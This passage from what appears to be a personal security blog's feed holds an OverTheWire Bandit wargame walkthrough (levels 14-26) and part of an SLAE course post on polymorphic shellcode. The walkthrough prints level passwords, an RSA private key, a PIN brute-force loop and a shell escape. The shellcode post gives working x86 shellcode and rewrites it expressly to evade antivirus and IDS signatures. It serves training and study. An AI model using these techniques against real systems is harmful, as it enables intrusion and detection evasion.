&lt;h2 id=&quot;level-14---level-15&quot;&gt;Level 14 - Level 15&lt;/h2&gt;
&lt;p&gt;The password for the next level can be retrieved by submitting the password of the current level to port &lt;strong&gt;30000&lt;/strong&gt; on localhost.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
bandit14@bandit:~$ which nc
/bin/nc
bandit14@bandit:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-15---level-16&quot;&gt;Level 15 - Level 16&lt;/h2&gt;
&lt;p&gt;The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit15@bandit:~$ echo BfMYroe26WYalil77FoDi9qh59eK5xNr | openssl s_client -connect localhost:30001 -quiet
depth=0 CN = bandit
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = bandit
verify return:1
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-16---level-17&quot;&gt;Level 16 - Level 17&lt;/h2&gt;
&lt;p&gt;The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit16@bandit:~$ for port in {31000..32000};do echo ''; echo Connected to $port;openssl s_client -connect localhost:$port -quiet;done
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;....
Connected to 31517
connect: Connection refused
connect:errno=111

Connected to 31518
depth=0 CN = bandit
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = bandit
verify return:1
test
test
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;bandit16@bandit:~$ for port in {31519..32000};do echo ''; echo Connected to $port;openssl s_client -connect localhost:$port -quiet;done
.....
Connected to 31789
connect: Connection refused
connect:errno=111

Connected to 31790
depth=0 CN = bandit
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = bandit
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-17---level-18&quot;&gt;Level 17 - Level 18&lt;/h2&gt;
&lt;p&gt;There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop/WarGames/OverTheWire/bandit# chmod 700 ./bandit17.pvt
root@kali:~/Desktop/WarGames/OverTheWire/bandit# ls -l
total 4
-rwx------ 1 root root 1675 Apr 16 03:57 bandit17.pvt
root@kali:~/Desktop/WarGames/OverTheWire/bandit# ssh -i bandit17.pvt bandit17@bandit.labs.overthewire.org -p 2220
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;bandit17@bandit:~$ diff passwords.new passwords.old 
42c42
&amp;lt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
---
&amp;gt; 6vcSC74ROI95NqkKaeEC2ABVMDX9TyUr
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;level-18---level-19&quot;&gt;Level 18 - Level 19&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit17@bandit:~$ ssh bandit18@localhost &quot;cat readme&quot;
bandit18@localhost's password: &amp;lt;bandit18 password - kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd&amp;gt;
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-19---level-20&quot;&gt;Level 19 - Level 20&lt;/h2&gt;
&lt;p&gt;To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit19@bandit:~$ ls -l
total 8
-rwsr-x--- 1 bandit20 bandit19 7408 Dec 28 14:34 bandit20-do
bandit19@bandit:~$ ./bandit20-do 
Run a command as another user.
  Example: ./bandit20-do id
bandit19@bandit:~$ ./bandit20-do whoami
bandit20
bandit19@bandit:~$ ./bandit20-do uname -a
Linux bandit 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-20---level-21&quot;&gt;Level 20 - Level 21&lt;/h2&gt;
&lt;p&gt;There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Terminal 1:
bandit20@bandit:~$ nc -lp 4455
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

Terminal 2:
bandit20@bandit:~$ ./suconnect 4455
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-21---level-22&quot;&gt;Level 21 - Level 22&lt;/h2&gt;
&lt;p&gt;A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in &lt;strong&gt;/etc/cron.d/&lt;/strong&gt; for the configuration and see what command is being executed.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit21@bandit:~$ cd /etc/cron.d/
bandit21@bandit:/etc/cron.d$ ls -l
total 16
-rw-r--r-- 1 root root 120 Dec 28 14:34 cronjob_bandit22
-rw-r--r-- 1 root root 122 Dec 28 14:34 cronjob_bandit23
-rw-r--r-- 1 root root 120 Dec 28 14:34 cronjob_bandit24
-rw-r--r-- 1 root root 190 Oct 31 13:21 popularity-contest
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&amp;gt; /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&amp;gt; /dev/null
bandit21@bandit:/etc/cron.d$ ls -l /usr/bin/cronjob_bandit22.sh
-rwxr-x--- 1 bandit22 bandit21 130 Dec 28 14:34 /usr/bin/cronjob_bandit22.sh
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 &amp;gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-22---level-23&quot;&gt;Level 22 - Level 23&lt;/h2&gt;
&lt;p&gt;A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit22@bandit:~$ cd /etc/cron.d
bandit22@bandit:/etc/cron.d$ ls -l
total 16
-rw-r--r-- 1 root root 120 Dec 28 14:34 cronjob_bandit22
-rw-r--r-- 1 root root 122 Dec 28 14:34 cronjob_bandit23
-rw-r--r-- 1 root root 120 Dec 28 14:34 cronjob_bandit24
-rw-r--r-- 1 root root 190 Oct 31 13:21 popularity-contest
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;amp;&amp;gt; /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;amp;&amp;gt; /dev/null
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;

cat /etc/bandit_pass/$myname &amp;gt; /tmp/$mytarget
bandit22@bandit:/etc/cron.d$ whoami
bandit22
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-23---level-24&quot;&gt;Level 23 - Level 24&lt;/h2&gt;
&lt;p&gt;A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.&lt;/p&gt;

&lt;p&gt;NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!&lt;/p&gt;

&lt;p&gt;NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls -l
total 16
-rw-r--r-- 1 root root 120 Dec 28 14:34 cronjob_bandit22
-rw-r--r-- 1 root root 122 Dec 28 14:34 cronjob_bandit23
-rw-r--r-- 1 root root 120 Dec 28 14:34 cronjob_bandit24
-rw-r--r-- 1 root root 190 Oct 31 13:21 popularity-contest
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&amp;gt; /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&amp;gt; /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;
for i in * .*;
do
    if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ];
    then
	echo &quot;Handling $i&quot;
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done


bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/
bandit23@bandit:/var/spool/bandit24$ echo '/bin/cat /etc/bandit_pass/bandit24 &amp;gt; /tmp/b24' &amp;gt; b24pass
bandit23@bandit:/var/spool/bandit24$ chmod +x b24pass
bandit23@bandit:/var/spool/bandit24$ ls -l b24pass
-rwxrwxr-x 1 bandit23 bandit23 46 Apr 16 10:57 b24pass
bandit23@bandit:/var/spool/bandit24$ cat b24pass
/bin/cat /etc/bandit_pass/bandit24 &amp;gt; /tmp/b24
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Wait for few seconds.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit23@bandit:/var/spool/bandit24$ cat /tmp/b24
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-24---level-25&quot;&gt;Level 24 - Level 25&lt;/h2&gt;
&lt;p&gt;A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234
Wrong! Please enter the correct pincode. Try again.
^C
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;for pin in {0..9}{0..9}{0..9}{0..9};do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin | nc localhost 30002;done
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The above method will definetely find the correct pin eventually, but it takes a lot of time.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bandit24@bandit:~$ for pin in {0..9}{0..9}{0..9}{0..9};do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin;done &amp;gt; /tmp/blah
bandit24@bandit:~$
bandit24@bandit:~$ cat /tmp/blah | nc localhost 30002 &amp;gt; /tmp/result
bandit24@bandit:~$ grep -v Wrong /tmp/result
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
bandit24@bandit:~$
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-25---level-26&quot;&gt;Level 25 - Level 26&lt;/h2&gt;
&lt;p&gt;Logging in to bandit26 from bandit25 should be fairly easy. The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit25@bandit:~$ ls -l               
total 4
-r-------- 1 bandit25 bandit25 1679 Dec 28 14:34 bandit26.sshkey
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost 
Could not create directory '/home/bandit25/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
               
      ,----..            ,----,          .---. 
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' ' 
  |   :  | ; | ' ;    |.';  ; ;   \  \;      : 
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ; 
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--&quot;  
     \   \ .'        ;   |.'       \   \ ;     
  www. `---` ver     '---' he       '---&quot; ire.org     
               
              
Welcome to OverTheWire!
...................
...................snipped

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to localhost closed.
bandit25@bandit:~$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The connection closes as soon as the banner is printed out. Let us examine further.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$     
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
bandit25@bandit:~$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So, the connection is closed as soon as &lt;code&gt;more ~/text.txt&lt;/code&gt; is run. &lt;strong&gt;more&lt;/strong&gt; is a filter for paging through text &lt;strong&gt;one screenful&lt;/strong&gt; at a time. so if we were to login from a terminal much smaller - two or three lines height - terminal, the more command would pause in between displaying the banner giving us a chance to escape this tight scenario.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;enter vi by pressing v.
press escape key and type &quot;:e /etc/bandit_pass/bandit26&quot; (without quotes)
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
&lt;/code&gt;&lt;/pre&gt;
</content>

 </entry>
 
 <entry>
   <title>SLAE Assignment 6 - Polymorphic Shellcode (Linux/x86)</title>
   <link href="http://localhost:4000/2017/10/28/slae-x86-assignment-6-polymorphic-shellcode/"/>
   <updated>2017-10-28T00:00:00+04:00</updated>
   <id>http://localhost:4000/2017/10/28/slae-x86-assignment-6-polymorphic-shellcode</id>
   <content type="html">&lt;p&gt;Polymorphism is a generic method to prevent pattern-matching. Pattern-matching means that a program P (an antivirus or an IDS) has a data-base with ‘signatures’. A signature is bytes suite identifying a program. We can defeat such pattern matching programs by replacing assembly instructions with other equivalent set of instructions which will result in different shellcode. Consider the below example clearing a register and moving some value into it.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;xor eax, eax
mov al, 0xa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The same result can be acheived with the following set of instructions as well.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;push 0xa
pop eax
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There are other set of instructions also which will yeild the same result, but with different shellcode bytes. The objective of this assignment are as follows:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Create polymorphic version of 3 shellcodes from &lt;a href=&quot;http://www.shell-storm.org&quot;&gt;shell-storm.org&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;The polymorphic version should not be greater than &lt;strong&gt;150%&lt;/strong&gt; of the original shellcode&lt;/li&gt;
  &lt;li&gt;Bonus points if the size of polymorphic shellcode is less than the original shellcode&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So without further ado, lets get down to business.&lt;/p&gt;

&lt;h3 id=&quot;1---linuxx86---set-procsysnetipv4ip_forward-to-0--exit---83-bytes&quot;&gt;#1 - Linux/x86 - Set ‘/proc/sys/net/ipv4/ip_forward’ to ‘0’ &amp;amp; exit() - 83 Bytes&lt;/h3&gt;
&lt;p&gt;The first shellcode is to set the value of &lt;code&gt;/proc/sys/net/ipv4/ip_forward&lt;/code&gt; to &lt;code&gt;0&lt;/code&gt; and can be found &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-848.php&quot;&gt;here&lt;/a&gt;. We would need root privileges to successfully run this shellcode.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/*
    In The Name of G0D
    Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' &amp;amp; exit() 
    Size : 83 Bytes
    fun for routers ;)
    Author : By Hamid Zamani (aka HAMIDx9)
    Member of ^^Ashiyane Digital Security Team^^

Disassembly of section .text:

08048054 &amp;lt;_start&amp;gt;:
 8048054:   31 c0                   xor    %eax,%eax
 8048056:   50                      push   %eax
 8048057:   68 77 61 72 64          push   $0x64726177
 804805c:   68 5f 66 6f 72          push   $0x726f665f
 8048061:   68 34 2f 69 70          push   $0x70692f34
 8048066:   68 2f 69 70 76          push   $0x7670692f
 804806b:   68 2f 6e 65 74          push   $0x74656e2f
 8048070:   68 73 79 73 2f          push   $0x2f737973
 8048075:   68 72 6f 63 2f          push   $0x2f636f72
 804807a:   66 68 2f 70             pushw  $0x702f
 804807e:   89 e3                   mov    %esp,%ebx
 8048080:   31 c9                   xor    %ecx,%ecx
 8048082:   b1 01                   mov    $0x1,%cl
 8048084:   b0 05                   mov    $0x5,%al
 8048086:   cd 80                   int    $0x80
 8048088:   89 c3                   mov    %eax,%ebx
 804808a:   31 c9                   xor    %ecx,%ecx
 804808c:   51                      push   %ecx
 804808d:   6a 30                   push   $0x30
 804808f:   89 e1                   mov    %esp,%ecx
 8048091:   31 d2                   xor    %edx,%edx
 8048093:   b2 01                   mov    $0x1,%dl
 8048095:   b0 04                   mov    $0x4,%al
 8048097:   cd 80                   int    $0x80
 8048099:   31 c0                   xor    %eax,%eax
 804809b:   83 c0 06                add    $0x6,%eax
 804809e:   cd 80                   int    $0x80
 80480a0:   31 c0                   xor    %eax,%eax
 80480a2:   40                      inc    %eax
 80480a3:   31 db                   xor    %ebx,%ebx
 80480a5:   cd 80                   int    $0x80
*/

#include &amp;lt;stdio.h&amp;gt;
int main(int argc,char **argv){

char shellcode[] = &quot;\x31\xc0\x50\x68\x77\x61\x72\x64\x68&quot;
                   &quot;\x5f\x66\x6f\x72\x68\x34\x2f\x69\x70&quot;
                   &quot;\x68\x2f\x69\x70\x76\x68\x2f\x6e\x65&quot;
                   &quot;\x74\x68\x73\x79\x73\x2f\x68\x72\x6f&quot;
                   &quot;\x63\x2f\x66\x68\x2f\x70\x89\xe3\x31&quot;
                   &quot;\xc9\xb1\x01\xb0\x05\xcd\x80\x89\xc3&quot;
                   &quot;\x31\xc9\x51\x6a\x30\x89\xe1\x31\xd2&quot;
                   &quot;\xb2\x01\xb0\x04\xcd\x80\x31\xc0\x83&quot;
                   &quot;\xc0\x06\xcd\x80\x31\xc0\x40\x31\xdb&quot;
                   &quot;\xcd\x80&quot;;
                   
     printf(&quot;Length: %d\n&quot;,strlen(shellcode));
     (*(void(*)()) shellcode)();
     
     return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Before we begin, lets make sure that this shellcode works.
&lt;img src=&quot;/assets/SLAE-x86/6.1-shellcode-848-og-running.PNG&quot; alt=&quot;shellcode-848-og-running&quot; /&gt;
So the shellcode is working fine. Lets write a polymorphic version for the above shellcode. Dumping assemby in Intel syntax.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;section .text
global _start

_start:
        xor eax,eax
        push eax
        push dword 0x64726177
        push dword 0x726f665f
        push dword 0x70692f34
        push dword 0x7670692f
        push dword 0x74656e2f
        push dword 0x2f737973
        push dword 0x2f636f72
        push word 0x702f

        mov ebx,esp
        xor ecx,ecx
        mov cl,0x1
        mov al,0x5
        int 0x80

        mov ebx,eax
        xor ecx,ecx
        push ecx
        push byte +0x30
        mov ecx,esp
        xor edx,edx
        mov dl,0x1
        mov al,0x4
        int 0x80

        xor eax,eax
        add eax,byte +0x6
        int 0x80

        xor eax,eax
        inc eax
        xor ebx,ebx
        int 0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;My idea is to replace the series of &lt;code&gt;push&lt;/code&gt; instructions in the original shellcode with equivalent instructions, changing the &lt;code&gt;push&lt;/code&gt; values at the same time.  Only the first &lt;code&gt;push&lt;/code&gt; value is hardcoded (with some number subtracted from it). We will derive values for the next &lt;code&gt;push&lt;/code&gt; instruction by adding/subtracting numbers from previously pushed value. The original instructions are commented out and equivalent instruction are written below it in the polymorphic version. This convention is followed throughtout this post. Polymorphic version of the above shellcode is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;; Title 	: SLAE Linux/x86 - Assignment-6.1
; Description	: Polymorphic version of Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' &amp;amp; exit() - 83 Bytes
; Original 	: http://shell-storm.org/shellcode/files/shellcode-848.php
; Author	: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 106 Bytes (~27.8% increase)
;
; nasm -f elf32 shellcode-848-poly.nasm -o shellcode-848-poly.o
; ld shellcode-848-poly.o -o shellcode-848-poly -z execstack

section .text
global _start

_start:

  xor eax,eax
  push eax
        
	;push dword 0x64726177
	push dword 0x63716076
	pop ebx				; 0x64726177 = 0x63716076 + 0x01010101
	add ebx, 0x01010101
	push ebx
        
	;push dword 0x726f665f
	add ebx, 0xdfd04e8		; 0x726f665f = 0x64726177 + 0xdfd04e8
	push ebx

  	;push dword 0x70692f34
	sub ebx, 0x206372b		; 0x70692f34 = 0x726f665f - 0x206372b
	push ebx	

  	;push dword 0x7670692f
	add ebx, 0x60739fb		; 0x7670692f = 0x70692f34 + 0x60739fb
	push ebx

  	;push dword 0x74656e2f
	sub ebx, 0x20afb01		; 0x74656e2f = 0x7670692f - 0x20afb01 + 1
	inc ebx				; +1 to avoid null byte [0x7670692f - 0x74656e2f] = [0x20afb00]
	push ebx

  	;push dword 0x2f737973
	sub ebx, 0x44f1f4bc		; 0x2f737973 = 0x74656e2f - 0x44f1f4bc
	push ebx

  	;push dword 0x2f636f72
	sub ebx, 0x11223344		; 0x2f737973 - 0x11223344 + 0x11122943 = 0x2f636f72
	add ebx, 0x11122943
	push ebx

  	push word 0x702f

 	 mov ebx,esp

	;xor ecx,ecx
  	;mov cl,0x1
	push 0x1
	pop ecx
	
  	mov al,0x5
  	int 0x80

	;mov ebx,eax
	push eax
	pop ebx

	xor ecx,ecx
    	push ecx
    	push byte +0x30
    	mov ecx,esp
        
	;xor edx,edx
    	;mov dl,0x1
	push 0x1
	pop edx
	
    	mov al,0x4
    	int 0x80

   	;xor eax,eax
    	;add eax,byte +0x6
	push 0x6
	pop eax

    	int 0x80

    	;xor eax,eax
   	;inc eax
	push 0x1
	pop eax

    	xor ebx,ebx
    	int 0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let us test our polymorphic version.
&lt;img src=&quot;/assets/SLAE-x86/6.1-shellcode-848-poly-running.PNG&quot; alt=&quot;shellcode-848-poly-running&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Original Shellcode 		: &lt;strong&gt;83 bytes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Polymorphic version 	: &lt;strong&gt;106 bytes (~27.8% increase)&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;2---linuxx86---sys_sethostnamepwned--8---32-bytes&quot;&gt;#2 - Linux/x86 - sys_sethostname(PwNeD !!, 8) - 32 bytes&lt;/h3&gt;
&lt;p&gt;The second shellcode changes the hostname to &lt;strong&gt;“PwNed !!”&lt;/strong&gt;. The original shellcode can be found &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-622.php&quot;&gt;here&lt;/a&gt;. For this one also we require root privileges to run successfully.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/*
Title  : sethostname &quot;pwned !!&quot;
Name   : 32 bytes sys_sethostname(&quot;PwNeD !!&quot;,8) x86 linux shellcode
Date   : may, 31 2009
